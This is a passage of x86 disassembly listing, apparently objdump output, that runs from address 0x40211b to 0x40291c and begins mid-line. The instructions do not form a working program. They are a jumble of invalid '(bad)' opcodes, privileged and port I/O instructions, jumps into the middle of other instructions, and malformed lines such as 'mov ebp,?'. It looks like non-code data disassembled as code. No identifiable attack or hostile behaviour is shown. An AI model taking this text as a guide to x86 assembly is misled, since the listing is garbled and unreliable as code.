  40211b:	es push esi
  40211d:	push   edi
  40211e:	adc    BYTE PTR [eax+0x890a71b],ch
  402124:	rcl    DWORD PTR [eax+0x76],0x62
  402128:	mov    ch,0x20
  40212a:	lea    esp,[ebx-0x4086521]
  402130:	xchg   DWORD PTR [edx-0x57],edi
  402133:	arpl   WORD PTR [edx+0x42],bx
  402136:	aam    0xfc
  402138:	adc    BYTE PTR [esp+esi*4-0x1dd68cc8],bl
  40213f:	(bad)  
  402141:	mov    ebp,0xa9ff0989
  402146:	dec    ebx
  402147:	mov    eax,ds:0xf5f63e67
  40214c:	mov    edx,0xae28da0
  402151:	xchg   esp,eax
  402152:	lods   eax,DWORD PTR ds:[esi]
  402153:	int3   
  402154:	sub    al,0xfd
  402156:	pusha  
  402157:	pusha  
  402158:	xor    al,0xee
  40215a:	mov    eax,ds:0xa977dc74
  40215f:	loope  0x402187
  402161:	mov    edi,0x2646167f
  402166:	test   al,0xe6
  402168:	jno    0x40218a
  40216a:	bound  edi,QWORD PTR ds:0xdae50d98
  402170:	push   eax
  402171:	imul   edx,DWORD PTR [edi+0x5e1d79e4],0xffffffbc
  402178:	sbb    BYTE PTR [esi+0x560fbce6],cl
  40217e:	(bad)  
  40217f:	fistp  QWORD PTR [edx+0x35]
  402182:	out    0xbb,al
  402184:	sbb    BYTE PTR [edi-0x21],bh
  402187:	dec    esi
  402188:	jb     0x402125
  40218a:	dec    ebx
  40218b:	push   esp
  40218d:	pop    ecx
  40218e:	mov    ebx,0x4c9856b8
  402193:	or     esp,DWORD PTR [eax+0x56feee93]
  402199:	jl     0x4021db
  40219b:	jo     0x402207
  40219d:	addr16 xchg esi,eax
  40219f:	rdtsc  
  4021a1:	out    0x97,al
  4021a3:	jg     0x4021d9
  4021a5:	jae    0x4021b6
  4021a7:	sub    DWORD PTR [edx-0x24614084],ecx
  4021ad:	push   DWORD PTR [eax+0x21e75466]
  4021b3:	and    edi,DWORD PTR [edx+eax*8-0x70]
  4021b7:	lds    eax,FWORD PTR [eax+0x7f03c928]
  4021bd:	popf   
  4021be:	sar    DWORD PTR [edi],0x65
  4021c1:	cli    
  4021c2:	and    al,0xba
  4021c4:	or     eax,0xbcbb0841
  4021c9:	imul   eax,edx,0x5aed4eb3
  4021cf:	xor    esp,DWORD PTR [edx]
  4021d1:	pop    edx
  4021d2:	push   es
  4021d3:	scas   eax,DWORD PTR es:[edi]
  4021d4:	aas    
  4021d5:	aad    0xd3
  4021d7:	push   ebp
  4021d8:	stos   DWORD PTR es:[edi],eax
  4021d9:	imul   eax,DWORD PTR [ebx-0x35],0x8962b257
  4021e0:	mov    ecx,0x1eb9640e
  4021e5:	retf   0xefd9
  4021e8:	mov    bl,0xec
  4021ea:	sbb    DWORD PTR [ecx+0x76],edi
  4021ed:	sub    DWORD PTR [ecx+edi*8+0x3b],ecx
  4021f1:	shr    DWORD PTR [edi+0x38],1
  4021f4:	cmp    BYTE PTR ds:0x73bd54c6,bh
  4021fa:	fnstsw WORD PTR [ecx]
  4021fc:	int    0x14
  4021fe:	mov    WORD PTR [ecx+0x23acf223],es
  402204:	inc    eax
  402205:	dec    edx
  402206:	daa    
  402207:	sbb    al,0xac
  402209:	ss cmp al,0x9b
  40220c:	add    BYTE PTR [eax],ch
  40220e:	jmp    0xb0a7:0xb4250389
  402215:	pop    es
  402216:	je     0x4021e5
  402218:	mov    esi,0xbf99a454
  40221d:	pop    esi
  40221e:	aad    0x30
  402220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402221:	jmp    0x700fce25
  402226:	xor    BYTE PTR [ebx],ah
  402228:	fcmovb st,st(6)
  40222a:	add    al,0xf4
  40222c:	daa    
  40222d:	lock pusha 
  40222f:	ds icebp 
  402231:	sub    bh,al
  402233:	add    ah,BYTE PTR [ebx+0x1fbd9490]
  402239:	ss ret 
  40223b:	popf   
  40223c:	data16 add ch,dl
  40223f:	push   ss
  402240:	and    BYTE PTR ds:0xaa2d9b0a,0x41
  402247:	jnp    0x40220d
  402249:	les    edx,FWORD PTR [edi-0x32c2780b]
  40224f:	xor    DWORD PTR [edi-0x72],ebp
  402252:	pop    es
  402253:	add    BYTE PTR [ecx],ch
  402255:	data16 mov bl,BYTE PTR [edx]
  402258:	xchg   ebx,eax
  402259:	push   ebx
  40225a:	xor    dl,BYTE PTR [eax+0x2]
  40225d:	and    BYTE PTR ds:0x84ab2e92,dh
  402263:	data16 cmp BYTE PTR [ebx+0x480b7cce],al
  40226a:	add    eax,0x1e381175
  40226f:	out    dx,al
  402270:	lock add cl,dh
  402273:	ins    BYTE PTR es:[edi],dx
  402274:	or     BYTE PTR [esi+0x65ed8786],ch
  40227a:	pop    edi
  40227b:	mov    esp,0x77b4539f
  402280:	pop    ss
  402281:	xlat   BYTE PTR ds:[ebx]
  402282:	(bad)  
  402283:	cmp    eax,0x67190a83
  402288:	hlt    
  402289:	cmp    BYTE PTR [eax],0x29
  40228c:	xchg   edi,eax
  40228d:	xor    DWORD PTR [ebp+0x10],edi
  402290:	test   eax,0x3d410e19
  402295:	std    
  402296:	imul   esp,DWORD PTR [esi],0xffffffe4
  402299:	mov    ecx,0xdd33e1c6
  40229e:	push   0x5db50bc3
  4022a3:	sub    esp,DWORD PTR [ebp-0x61]
  4022a6:	sbb    eax,0xa02e7e3e
  4022ab:	fwait
  4022ac:	pop    DWORD PTR [ebp+0x2fdb513f]
  4022b2:	and    al,0x2c
  4022b4:	rcl    DWORD PTR [esi+0x1c109a1d],0xda
  4022bb:	fmul   QWORD PTR [edx]
  4022bd:	bound  ebp,QWORD PTR [esi]
  4022bf:	pop    edi
  4022c0:	cmc    
  4022c1:	imul   edx,DWORD PTR [ebp+0x6a9564e8],0x8e5f009a
  4022cb:	adc    DWORD PTR [edi-0x66],ecx
  4022ce:	sar    DWORD PTR [esi+0x24],1
  4022d1:	leave  
  4022d2:	dec    esp
  4022d3:	add    esp,esi
  4022d5:	in     eax,dx
  4022d6:	call   0x4c1692ab
  4022db:	mov    DWORD PTR [ebx+ecx*4+0x42],ecx
  4022df:	lods   al,BYTE PTR ds:[esi]
  4022e0:	sub    eax,0x353c6c93
  4022e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022e6:	aas    
  4022e7:	scas   eax,DWORD PTR es:[edi]
  4022e8:	mov    al,0xc7
  4022ea:	sbb    eax,0x678f45a2
  4022ef:	fnstenv [ebx]
  4022f1:	dec    esp
  4022f2:	inc    ebx
  4022f3:	ja     0x402307
  4022f5:	jns    0x402294
  4022f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022f8:	aas    
  4022f9:	push   esp
  4022fa:	push   ss
  4022fb:	mov    edi,0xbb525dbb
  402300:	xchg   edx,eax
  402301:	data16 jecxz 0x40236f
  402304:	jb     0x402309
  402306:	mov    ebp,0x6a7cdfe6
  40230b:	mov    ah,0x52
  40230d:	mov    eax,0x9e18e1e7
  402312:	lahf   
  402313:	xor    BYTE PTR [ebp-0x462c5f2b],0x1a
  40231a:	push   edi
  40231b:	or     DWORD PTR [bx+si],0xd8ed7696
  402322:	add    dl,al
  402324:	ja     0x4022a9
  402326:	mov    ecx,0x6164d006
  40232b:	mov    bl,0x56
  40232d:	add    BYTE PTR [esi-0x79],al
  402330:	dec    edx
  402331:	(bad)  
  402332:	fwait
  402333:	loopne 0x402315
  402335:	jmp    0x402333
  402337:	dec    ebp
  402338:	sub    al,0x96
  40233a:	jmp    0x4023b2
  40233c:	(bad)  
  40233d:	jno    0x40237a
  40233f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402340:	clc    
  402341:	xlat   BYTE PTR ds:[ebx]
  402342:	scas   al,BYTE PTR es:[edi]
  402343:	sub    eax,0xce60d4e7
  402348:	mov    ds:0x96b11354,eax
  40234d:	and    eax,0xd26be9ee
  402352:	jb     0x402374
  402354:	repnz sub eax,0x75c79c65
  40235a:	daa    
  40235b:	inc    edx
  40235c:	cmp    DWORD PTR [edx-0x6f43eece],edx
  402362:	arpl   WORD PTR fs:[ebp+0x3e35bb95],bx
  402369:	pop    esp
  40236a:	inc    DWORD PTR [ecx-0x4b4903fd]
  402370:	into   
  402371:	div    DWORD PTR [ecx]
  402373:	dec    esp
  402374:	push   cs
  402375:	mov    ds:0xb189baeb,al
  40237a:	push   ebp
  40237b:	iret   
  40237c:	mov    gs,WORD PTR [esi-0x7f]
  40237f:	fisub  DWORD PTR [edx-0x7a]
  402382:	test   DWORD PTR [ebx-0x4818dc57],0x228009db
  40238c:	sbb    ah,bh
  40238e:	clc    
  40238f:	in     al,0x81
  402391:	lods   eax,DWORD PTR ds:[esi]
  402392:	or     edi,DWORD PTR [edx-0x72807e74]
  402398:	(bad)  
  40239a:	mov    ch,0xad
  40239c:	mov    ecx,0x77d6dcdb
  4023a1:	push   ds
  4023a2:	inc    edi
  4023a3:	mov    bh,BYTE PTR [ecx]
  4023a5:	mul    BYTE PTR [esi]
  4023a7:	adc    ecx,ebp
  4023a9:	cmp    DWORD PTR [edi-0x53],esi
  4023ac:	fsubr  QWORD PTR [esi-0x17e07a6a]
  4023b2:	int    0xfb
  4023b4:	jge    0x402396
  4023b6:	ss mov ah,0x5d
  4023b9:	sbb    eax,0x6220e61b
  4023be:	mov    cs,WORD PTR [edi+edi*4-0x2c995877]
  4023c5:	das    
  4023c6:	inc    edx
  4023c7:	mov    BYTE PTR [esi+0x76f5f73a],ch
  4023cd:	in     eax,dx
  4023ce:	dec    edi
  4023cf:	repnz dec esp
  4023d1:	push   es
  4023d2:	jno    0x4023d4
  4023d4:	add    eax,0x63c9125e
  4023d9:	sub    eax,0xdd73b397
  4023de:	stos   DWORD PTR es:[edi],eax
  4023df:	ret    0x91ce
  4023e2:	inc    edi
  4023e3:	mov    WORD PTR [esi],ds
  4023e5:	mov    cl,0x4a
  4023e7:	pop    edi
  4023e8:	fcom   DWORD PTR [eax]
  4023ea:	out    dx,al
  4023eb:	ret    
  4023ec:	mov    eax,ds:0x78abd69d
  4023f1:	xchg   esp,eax
  4023f2:	xlat   BYTE PTR ds:[ebx]
  4023f3:	into   
  4023f4:	pop    eax
  4023f5:	pop    esp
  4023f6:	pop    ebx
  4023f7:	push   ecx
  4023f8:	nop
  4023f9:	mov    dl,0xa1
  4023fb:	mov    ah,0xd4
  4023fd:	jnp    0x40238f
  4023ff:	sahf   
  402400:	adc    esp,DWORD PTR [edx+0x16c7892c]
  402406:	popa   
  402407:	test   al,0xe6
  402409:	mov    BYTE PTR [ebx],bh
  40240b:	cmc    
  40240c:	(bad)  
  40240d:	sbb    esp,edx
  40240f:	nop
  402410:	ror    ah,1
  402412:	mov    gs,WORD PTR [edi+0x725b5117]
  402418:	adc    ah,dh
  40241a:	jns    0x402404
  40241c:	(bad)  
  40241d:	lds    ebp,FWORD PTR ds:0xa7841ed2
  402423:	into   
  402424:	mov    eax,ds:0x3c1715a2
  402429:	lahf   
  40242a:	dec    eax
  40242b:	inc    eax
  40242c:	sub    esi,DWORD PTR [edi+edx*4]
  40242f:	fwait
  402430:	xadd   BYTE PTR [edi-0x2f0d0134],al
  402437:	and    eax,0x7d192654
  40243c:	js     0x4023d1
  40243e:	stc    
  40243f:	test   eax,0xea83d165
  402444:	pop    esi
  402445:	push   ebp
  402446:	xchg   ebx,eax
  402447:	pop    es
  402448:	mov    esi,0x27fcade7
  40244d:	or     eax,0x9f54db5c
  402452:	mov    ebp,?
  402454:	je     0x40241e
  402456:	inc    ecx
  402457:	sbb    al,0xc5
  402459:	adc    ebx,DWORD PTR fs:[edi]
  40245c:	lea    ecx,[esi]
  40245e:	loopne 0x40248d
  402460:	push   ebp
  402461:	pop    ds
  402462:	mov    esp,0x842dd200
  402467:	retf   0x511a
  40246a:	aas    
  40246b:	pop    ebx
  40246c:	(bad)  
  40246d:	fistp  WORD PTR [ebp+0x5b39a8fc]
  402473:	xchg   ebp,eax
  402474:	cmp    BYTE PTR [ecx],bl
  402476:	and    al,0x9a
  402478:	inc    esi
  402479:	cmp    al,0xea
  40247b:	push   eax
  40247c:	mov    ebp,0xb38a8f41
  402481:	inc    esp
  402482:	outs   dx,BYTE PTR ds:[esi]
  402483:	mov    ds:0xd458448b,eax
  402488:	(bad)  
  402489:	out    dx,al
  40248a:	and    al,0x18
  40248c:	call   ebp
  40248e:	addr16 mov eax,0x7a03c127
  402494:	pop    edi
  402495:	sub    eax,0x1a68ec26
  40249a:	(bad)  
  40249b:	sub    DWORD PTR ds:[edx],0x2a
  40249f:	jnp    0x40242d
  4024a1:	inc    edx
  4024a2:	mov    ds:0x3b7335a4,eax
  4024a7:	les    ecx,FWORD PTR [eax-0x551c4eb]
  4024ad:	inc    ecx
  4024ae:	imul   BYTE PTR [ebx-0x456baae8]
  4024b4:	dec    ebx
  4024b5:	push   es
  4024b6:	aam    0x98
  4024b8:	mov    al,ds:0xf0f25dc9
  4024bd:	and    dl,BYTE PTR [ebx-0x4e]
  4024c0:	push   edx
  4024c1:	je     0x402492
  4024c3:	mov    bl,0xc9
  4024c5:	hlt    
  4024c6:	lock jge 0x402537
  4024c9:	or     al,dl
  4024cb:	out    0x5f,eax
  4024cd:	(bad)  
  4024cf:	(bad)  
  4024d0:	in     al,dx
  4024d1:	push   0xf4809eca
  4024d6:	mov    esi,0x731b177e
  4024db:	inc    ebx
  4024dc:	dec    edi
  4024dd:	cmovns eax,esi
  4024e0:	mov    ch,0xec
  4024e2:	cwde   
  4024e3:	int3   
  4024e4:	mov    esp,0xcd7ceeef
  4024e9:	out    dx,al
  4024ea:	or     ebp,DWORD PTR [esi+0x35250d1]
  4024f0:	jmp    0x4d79fe7d
  4024f5:	in     eax,dx
  4024f6:	cmp    BYTE PTR [esi],dh
  4024f8:	jge    0x4024df
  4024fa:	std    
  4024fb:	das    
  4024fc:	(bad)  
  4024fd:	jle    0x4024af
  4024ff:	mov    ss,WORD PTR [edi]
  402501:	hlt    
  402502:	cdq    
  402503:	push   eax
  402504:	mov    ch,BYTE PTR ds:0x4873aa9c
  40250a:	cmp    eax,0x21c99075
  40250f:	retf   0xfe9a
  402512:	ror    BYTE PTR [ebx],cl
  402514:	(bad)  
  402515:	fist   DWORD PTR [esi-0x4dcab5d3]
  40251b:	arpl   dx,di
  40251d:	push   es
  40251e:	repnz repnz in al,0xc9
  402522:	jns    0x40256d
  402524:	dec    esi
  402525:	fwait
  402526:	xor    bl,0x8f
  402529:	iret   
  40252a:	divps  xmm0,XMMWORD PTR [edi+0x6aead10e]
  402531:	neg    DWORD PTR [eax+0x37bc4084]
  402537:	int3   
  402538:	stc    
  402539:	fdivr  QWORD PTR ds:0x8654e0bf
  40253f:	lods   al,BYTE PTR ds:[esi]
  402540:	(bad)  
  402542:	and    DWORD PTR [ecx+0x2319f73c],0x6e9f8325
  40254c:	push   ds
  40254d:	sub    BYTE PTR [edi+0x45],ch
  402550:	cmp    cl,0xc
  402553:	push   es
  402554:	and    DWORD PTR [eax+0xa2a15ff],0x51
  40255b:	xchg   BYTE PTR [ebx+edx*1+0x1f],ch
  40255f:	xchg   DWORD PTR [ebx+edi*2-0xacbe3c9],edx
  402566:	push   ds
  402567:	stos   BYTE PTR es:[edi],al
  402568:	and    al,0xe2
  40256a:	cmp    dl,cl
  40256c:	in     al,0x17
  40256e:	and    DWORD PTR [ebp+0x79],0x8f7baf80
  402575:	mov    ebx,0x513828cd
  40257a:	sbb    BYTE PTR [esi-0x1eb994f2],cl
  402580:	add    al,0x88
  402582:	mov    dh,0x8d
  402584:	pop    edi
  402585:	jl     0x402597
  402587:	push   edx
  402588:	js     0x40256e
  40258a:	pushf  
  40258b:	push   es
  40258c:	push   edx
  40258d:	sbb    dh,BYTE PTR [edx]
  40258f:	shl    DWORD PTR [ebx],1
  402591:	fisub  DWORD PTR [esi+0x482454b7]
  402597:	cld    
  402598:	mov    bh,0xae
  40259a:	pop    esp
  40259b:	add    bh,bl
  40259d:	dec    ebp
  40259e:	ss or  dh,cl
  4025a1:	(bad)  
  4025a2:	les    ebx,FWORD PTR [ebp+0x79]
  4025a5:	lahf   
  4025a6:	std    
  4025a7:	jnp    0x40259b
  4025a9:	div    DWORD PTR [esi-0x35]
  4025ac:	in     eax,0x9d
  4025ae:	adc    al,0x8d
  4025b0:	outs   dx,DWORD PTR ds:[esi]
  4025b1:	mov    bh,0x86
  4025b3:	push   ebx
  4025b4:	dec    ecx
  4025b5:	clc    
  4025b6:	or     ecx,DWORD PTR [eax]
  4025b8:	dec    esp
  4025b9:	ret    0x4c80
  4025bc:	shr    DWORD PTR ds:0xd6716510,0x21
  4025c3:	dec    edi
  4025c4:	pop    ebp
  4025c5:	mov    ah,0x72
  4025c7:	int    0x9
  4025c9:	out    dx,al
  4025ca:	fild   WORD PTR [eax+0x35d52b4b]
  4025d0:	pop    ds
  4025d1:	add    ecx,DWORD PTR [ecx+edi*2-0x70]
  4025d5:	fistp  QWORD PTR [esi+edx*4+0x14]
  4025d9:	rcr    BYTE PTR [edx-0x61],1
  4025dc:	ins    BYTE PTR es:[edi],dx
  4025dd:	(bad)  
  4025de:	fidiv  WORD PTR [edx]
  4025e0:	dec    esi
  4025e1:	ret    
  4025e2:	cmp    al,0xea
  4025e4:	ja     0x4025c3
  4025e6:	push   eax
  4025e7:	scas   eax,DWORD PTR es:[edi]
  4025e8:	sub    al,0x37
  4025ea:	xlat   BYTE PTR ds:[ebx]
  4025eb:	test   BYTE PTR [edx],bh
  4025ed:	cwde   
  4025ee:	ficom  DWORD PTR [edx-0x11b5487f]
  4025f4:	inc    ebp
  4025f5:	pop    esp
  4025f6:	jp     0x402647
  4025f8:	jne    0x40260b
  4025fa:	xchg   DWORD PTR [ebx],ebp
  4025fc:	mov    ch,0x59
  4025fe:	pop    ds
  4025ff:	and    ebp,DWORD PTR [ebx-0x39]
  402602:	stc    
  402603:	mov    edi,0x1a24efb1
  402608:	lea    ebx,[edi+0x46115efc]
  40260e:	int    0xef
  402610:	xchg   edx,eax
  402611:	jecxz  0x40263d
  402613:	leave  
  402614:	outs   dx,BYTE PTR ds:[esi]
  402615:	mov    ebx,0xd7642c26
  40261a:	lahf   
  40261b:	std    
  40261c:	dec    ebp
  40261d:	mov    bl,0x74
  40261f:	ins    DWORD PTR es:[edi],dx
  402620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402621:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402622:	imul   esp,DWORD PTR [ebp-0x2],0xfffffff2
  402626:	scas   al,BYTE PTR es:[edi]
  402627:	push   ds
  402628:	ins    DWORD PTR es:[edi],dx
  402629:	mov    bl,BYTE PTR [ecx]
  40262b:	fbld   TBYTE PTR [esi+0x71346f85]
  402631:	and    cl,BYTE PTR [edi-0x10]
  402634:	mov    al,ds:0x2ddc2e5
  402639:	xor    DWORD PTR [edi],eax
  40263b:	jg     0x402630
  40263d:	dec    edi
  40263e:	and    BYTE PTR [edi-0x1a],al
  402641:	int    0x90
  402643:	test   DWORD PTR [esi],0x1097ca90
  402649:	jge    0x4025ea
  40264b:	jmp    0x56db:0xcd60b2e2
  402652:	adc    DWORD PTR [edi-0x2a98a78f],0xbc91cee
  40265c:	(bad)  
  40265d:	cmp    eax,0xfb3cef0d
  402662:	mov    DWORD PTR [ebx-0x4b4a08d6],edi
  402668:	cmc    
  402669:	scas   eax,DWORD PTR es:[edi]
  40266a:	mov    al,dh
  40266c:	aad    0xe3
  40266e:	jb     0x40262e
  402670:	inc    edi
  402671:	dec    ebx
  402672:	mov    cl,0x15
  402674:	not    BYTE PTR [ecx]
  402676:	add    bl,BYTE PTR [edx-0x61042877]
  40267c:	imul   ebp,DWORD PTR [eax+0x11],0xc2c95234
  402683:	dec    ebp
  402684:	push   es
  402685:	dec    edi
  402686:	xor    DWORD PTR [ebx*1+0x357b03f8],edx
  40268d:	and    ch,ah
  40268f:	push   0xc5fa5530
  402694:	stos   BYTE PTR es:[di],al
  402696:	sub    eax,0x63d1df4e
  40269b:	inc    ecx
  40269c:	pop    eax
  40269d:	mov    bl,BYTE PTR [eax+esi*1]
  4026a0:	out    dx,eax
  4026a1:	xlat   BYTE PTR ds:[ebx]
  4026a2:	add    DWORD PTR [ebp+0x4595d184],ecx
  4026a8:	(bad)
  4026ac:	mov    esi,0x4ff3accd
  4026b1:	test   al,0x61
  4026b3:	into   
  4026b4:	jg     0x40268f
  4026b6:	jno    0x402684
  4026b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026b9:	test   dh,al
  4026bb:	cmp    DWORD PTR [ecx-0x45e68c2b],0xffffffea
  4026c2:	xchg   ebx,eax
  4026c3:	lock xchg esp,eax
  4026c6:	or     edi,esp
  4026c8:	iret   
  4026c9:	test   BYTE PTR [edx-0x7164d337],dl
  4026cf:	push   edx
  4026d0:	mov    bh,0x71
  4026d2:	enter  0x7603,0x21
  4026d6:	mov    ds:0x44035b86,al
  4026db:	jle    0x402707
  4026dd:	shr    bl,1
  4026df:	mov    ds:0x9068b47e,eax
  4026e4:	xor    al,0xf
  4026e6:	cmc    
  4026e7:	sbb    BYTE PTR [ebp-0x64],dl
  4026ea:	scas   al,BYTE PTR es:[edi]
  4026eb:	cmp    DWORD PTR [ecx*4+0x45e8dc03],ebx
  4026f2:	lods   eax,DWORD PTR ds:[esi]
  4026f3:	nop
  4026f4:	pop    edx
  4026f5:	cmp    al,0x72
  4026f7:	jge    0x402718
  4026f9:	sbb    ch,bh
  4026fb:	add    ah,bh
  4026fd:	test   DWORD PTR [edx+0x3b],edx
  402700:	xchg   ecx,eax
  402701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402702:	pop    esp
  402703:	in     eax,dx
  402704:	push   esp
  402705:	mov    dh,0x3f
  402707:	clc    
  402708:	xor    al,0x88
  40270a:	jae    0x40277d
  40270c:	inc    ebx
  40270d:	(bad)  
  40270e:	ins    BYTE PTR es:[edi],dx
  40270f:	and    al,0xdb
  402711:	xor    DWORD PTR [esi+0x31f8003c],0x74e1cbf0
  40271b:	ret    
  40271c:	mov    edx,0xc89f564
  402721:	mov    es,eax
  402723:	adc    ah,BYTE PTR [eax+eax*8+0xa3eddc8]
  40272a:	repz fstp TBYTE PTR [esi-0x62]
  40272e:	fld    DWORD PTR ds:0x22398657
  402734:	inc    edx
  402735:	add    BYTE PTR [ebp+0x3b049f1],cl
  40273b:	mov    bl,0xc6
  40273d:	je     0x402757
  40273f:	xchg   DWORD PTR [eax],esp
  402741:	(bad)  
  402742:	pop    ecx
  402743:	cs pop ebp
  402745:	(bad)  
  402746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402747:	jno    0x40271d
  402749:	(bad)  
  40274a:	pusha  
  40274b:	push   edi
  40274c:	or     al,0x7a
  40274e:	xchg   edx,eax
  40274f:	adc    dl,al
  402751:	cmp    edx,DWORD PTR [esp+eiz*8+0x635772db]
  402758:	mov    edx,0x823da1cd
  40275d:	mov    al,ds:0x81d38f48
  402762:	and    ch,cl
  402764:	imul   ebp,DWORD PTR [ecx-0x6e175c16],0x142afa42
  40276e:	aad    0x47
  402770:	rcr    DWORD PTR [edx+0x40304206],cl
  402776:	ret    
  402777:	mov    BYTE PTR [esi-0x1f],bh
  40277a:	test   eax,0x72723e7b
  40277f:	(bad)  
  402780:	jg     0x40275d
  402782:	xor    ch,BYTE PTR [eax+0x3e2a56b3]
  402788:	icebp  
  402789:	(bad)  
  40278a:	lods   eax,DWORD PTR ds:[esi]
  40278b:	popa   
  40278c:	xchg   edx,eax
  40278d:	mov    WORD PTR [ebx],es
  40278f:	inc    edi
  402790:	div    DWORD PTR [eax+ebx*8+0x54b7e3bf]
  402797:	push   edi
  402798:	cmc    
  402799:	xchg   edx,eax
  40279a:	jmp    0x402742
  40279c:	mov    bh,0xe4
  40279e:	dec    esp
  40279f:	pop    esp
  4027a0:	push   ds
  4027a1:	inc    ecx
  4027a2:	sbb    al,0x8a
  4027a4:	push   ecx
  4027a5:	mov    bl,0xe8
  4027a7:	ja     0x4027fa
  4027a9:	sub    DWORD PTR [edx+0x3108fe79],esi
  4027af:	les    ebp,FWORD PTR [ebp+eax*1-0x6767978c]
  4027b6:	push   0x8f12e8b8
  4027bb:	imul   esp,DWORD PTR [eax+0x3fc4f886],0xa21ece2f
  4027c5:	add    al,0x6
  4027c7:	xchg   esi,eax
  4027c8:	jp     0x4027af
  4027ca:	test   DWORD PTR [esi],ebp
  4027cc:	add    eax,0x399d44a1
  4027d1:	lock mov eax,ds:0xc9324b36
  4027d7:	pop    ds
  4027d8:	xor    esp,DWORD PTR [esi+0x428ce64b]
  4027de:	add    bl,al
  4027e0:	or     al,0x59
  4027e2:	dec    edi
  4027e3:	xchg   edx,eax
  4027e4:	dec    ebp
  4027e5:	shl    DWORD PTR [edi+0xe153d50],cl
  4027eb:	fadd   DWORD PTR [ecx]
  4027ed:	and    al,0x23
  4027ef:	push   esi
  4027f0:	je     0x4027eb
  4027f2:	loope  0x4027f5
  4027f4:	mov    ah,0x11
  4027f6:	sub    BYTE PTR [edx-0xbdb3153],0x11
  4027fd:	xchg   ecx,eax
  4027fe:	mov    cl,0x84
  402800:	(bad)  
  402801:	ins    DWORD PTR es:[edi],dx
  402802:	inc    ecx
  402803:	je     0x402789
  402805:	mov    ecx,DWORD PTR [esi+0x53]
  402808:	pop    edi
  402809:	fsub   DWORD PTR [ecx]
  40280b:	into   
  40280c:	(bad)  
  40280d:	and    esp,DWORD PTR [esi]
  40280f:	in     al,0xc5
  402811:	jae    0x4027d0
  402813:	nop
  402814:	mov    ebx,0x67d5ca88
  402819:	mov    ebp,0xda97b674
  40281e:	sbb    bh,BYTE PTR [ecx+0x34]
  402821:	fcomp  DWORD PTR [ecx-0x7f]
  402824:	aaa    
  402825:	pop    ecx
  402826:	arpl   WORD PTR [edi-0x70581fd7],bx
  40282c:	xchg   ebp,eax
  40282d:	fadd   DWORD PTR [esi+0x21da1229]
  402833:	push   esi
  402834:	icebp  
  402835:	lock (bad) 
  402837:	mov    ch,0x38
  402839:	mul    ah
  40283b:	jmp    FWORD PTR ds:0xc973
  402840:	push   eax
  402841:	ja     0x402853
  402843:	inc    edi
  402844:	mov    ch,0xc4
  402846:	push   eax
  402847:	push   ebp
  402848:	sub    BYTE PTR [ebp+0x5f],bl
  40284b:	shl    BYTE PTR [ecx-0x56],0xee
  40284f:	sbb    DWORD PTR [edx+eax*1-0x43c82acc],esp
  402856:	cs hlt 
  402858:	(bad)  
  402859:	inc    esp
  40285a:	xchg   edi,eax
  40285b:	or     al,0x6b
  40285d:	push   ebp
  40285e:	mov    bh,0x58
  402860:	ret    0xf342
  402863:	cmp    bl,BYTE PTR ds:0xfcf3a32a
  402869:	sahf   
  40286a:	mov    eax,ds:0xe189d8cf
  40286f:	(bad)  [eax+0x9]
  402872:	push   0xffffffb5
  402874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402875:	ds add ch,cl
  402878:	repz pop edi
  40287a:	xchg   ecx,eax
  40287b:	(bad)  
  40287c:	ds (bad) 
  40287e:	popf   
  40287f:	pusha  
  402880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402881:	sbb    al,0x7d
  402883:	pop    esp
  402884:	imul   ebx,DWORD PTR [eax+0x8],0xffffffd2
  402888:	popa   
  402889:	push   ds
  40288a:	pop    edi
  40288b:	lock scas al,BYTE PTR es:[edi]
  40288d:	hlt    
  40288e:	add    bh,BYTE PTR [ebx]
  402890:	xchg   edi,eax
  402891:	jecxz  0x402906
  402893:	add    ebx,edx
  402895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402896:	test   BYTE PTR [edx],0xc0
  402899:	scas   eax,DWORD PTR es:[edi]
  40289a:	dec    ebp
  40289b:	stos   BYTE PTR es:[edi],al
  40289c:	mov    bh,0xc0
  40289e:	cmp    DWORD PTR [edi+0x578f2f95],edx
  4028a4:	push   ebp
  4028a5:	fild   QWORD PTR [ebx+edx*8+0x3d]
  4028a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028aa:	dec    edx
  4028ab:	ins    DWORD PTR es:[edi],dx
  4028ac:	adc    eax,0x421f7126
  4028b2:	xchg   BYTE PTR [edi],ch
  4028b4:	push   esi
  4028b5:	cli    
  4028b6:	mov    ds:0xd2648511,eax
  4028bb:	add    edi,DWORD PTR [edi-0x74]
  4028be:	outs   dx,DWORD PTR ds:[esi]
  4028bf:	loop   0x4028c2
  4028c1:	xor    esi,DWORD PTR ds:0xe5d0955
  4028c7:	js     0x402873
  4028c9:	dec    ebx
  4028ca:	lea    esp,[edi-0x36]
  4028cd:	nop
  4028ce:	(bad)  
  4028cf:	clc    
  4028d0:	call   0x91ea3a59
  4028d5:	mov    ebx,?
  4028d7:	mov    bl,0x5e
  4028d9:	mov    ds:0x374279eb,al
  4028de:	pop    edx
  4028df:	js     0x4028c8
  4028e1:	sahf   
  4028e2:	xor    al,BYTE PTR [eax-0x76]
  4028e5:	cwde   
  4028e6:	sbb    eax,0xddce63fb
  4028eb:	mov    esp,0x5684373c
  4028f0:	push   ebx
  4028f1:	scas   al,BYTE PTR es:[edi]
  4028f2:	jp     0x402886
  4028f4:	std    
  4028f5:	add    BYTE PTR [esi-0x1fdf10a8],al
  4028fb:	dec    ebp
  4028fc:	(bad)  
  4028fd:	fsubr  DWORD PTR [edx+0x1e5a7880]
  402903:	cmc    
  402904:	jb     0x402946
  402906:	mov    edx,0xf432f178
  40290b:	inc    ebx
  40290c:	xor    ecx,DWORD PTR [edx+0x14cca337]
  402912:	sbb    al,0x5f
  402914:	into   
  402915:	push   edi
  402916:	xor    edx,DWORD PTR [ebx+0x1f4fee33]
  40291c:	sub    edx,DWORD PTR [edx-0x77]
